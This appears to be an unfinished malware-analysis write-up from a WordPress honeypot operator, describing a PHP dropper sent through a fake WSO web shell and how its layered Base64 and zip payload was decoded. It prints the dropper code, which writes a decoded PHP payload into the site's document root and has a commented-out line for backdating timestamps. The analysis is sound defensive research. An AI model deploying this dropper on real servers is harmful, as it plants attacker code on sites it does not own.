# nptzow - 

What this stupid thing does.

## Origin

PHP "dropper" code passed to a fake WSO ([Web Shell by oRb]())
via the `Php` action. WSO has a way to evaluate arbitrary PHP source
code via the `eval()` builtin. The "action" string and the PHP source
to eval arrive via POST parameters.

The fake WSO is part of a WordPress honeypot I've operated off and on
for the last 4 years. Everything assumed to happen in a WordPress
installation.

The downloader seems to believe that the WSO instance is hidden in
a "revslider" plugin. Revslider had an exploit in the XXX timeframe,
and a lot of bottom feeders tried to exploit it at the time.

### Source IP Address

## Dropper

    $a="PD9waHAgCmlmKCBpc3NldCgkX1JFUVVFU1RbInRlc3RfdXJsIl0pICl7CmVjaG8gImZpbGUgdGVzdCBva2F5IjsKCn0KDQoN
    $file_name = "4048ad7bdb2.php";
    if( !empty($_SERVER["REAL_DOCUMENT_ROOT"]) ){
        $doc_root = $_SERVER["REAL_DOCUMENT_ROOT"];
    } else {
        $doc_root = $_SERVER["DOCUMENT_ROOT"];
    }
    
    $f_n = $doc_root . "/" . $file_name;
    
    if ( !write_file($f_n, $a) )
        write_file($file_name, $a);
    
    function write_file($file_name, $a){
    
        if( file_exists($file_name) ){
            copy($file_name, $file_name."_backup");
        }
       if( file_put_contents($file_name, base64_decode($a)) )
        {
            echo "OK file saved";
            //touch($file_name, time() - 3600 * 24 * rand(10, 70));
            return true;
        }
    
        return false;
    }

The dropper code contains a blob of Base64-encoded PHP source.
It creates a file name `4048ad7bdb2.php` somewhere in a WordPress
file tree. If a file named `4048ad7bdb2.php` already resides in
the WordPress file tree, it gets moved to `4048ad7bdb2.php_backup`.
The dropper decodes the PHP source, then writes it to `4048ad7bdb2.php`.
It echoes "OK file saved", which presumably lets the process
transferring the dropper code know that the file creation and
source decoding worked.

/*
Like a lot of PHP malware, the downloader made more than one
attempt to get a PHP file in the WordPress installation.
One attempt tried to created a file `4048ad7bdb2.php`, the
other attempt tried to create a file `
*/

Like a lot of PHP malware, the dropper makes more than one attempt
to create `4048ad7bdb2.php`. The `file_write()` function returns
a boolean that isn't checked by the caller, and it has some
commented out code that appears to set a file's time stamp to
between 10 and 70 days in the past.

Stylistically, the dropper is only a little uneven. I hypothesize
that it hasn't evolved via feature addition yet.

## Decoding

### Level 1 code

I got to level 1 code by hand-editing file `194.165.16.79WhdX2hdZm0Z2rcNQ09X9ZgAAAAA.php.file`
into file `dc1.php`. This is just the Base64-encoded string, and two
PHP function calls to create file `4048ad7bdb2.php` with the
Base64-decoded string in it.

### Level 2 code

Executing `dc1.php` yields file `4048ad7bdb2.php` which contains
yet another Based64-encoded block of bytes, and a native PHP
implementation of Gzip, [class PclZip](https://github.com/WordPress/WordPress/blob/master/wp-admin/includes/class-pclzip.php).

The level 2 code Base64-decodes a long string, and puts the results
in a file `nptzow.zip`. It proceeds to unzip `nptzow.zip`. If that
succeeds, it echoes the string "1425756856", if unzipping fails,
it echoes PclZip error information.

### nptzow.zip

`nptzow.zip` expands into a directory full of goodies.
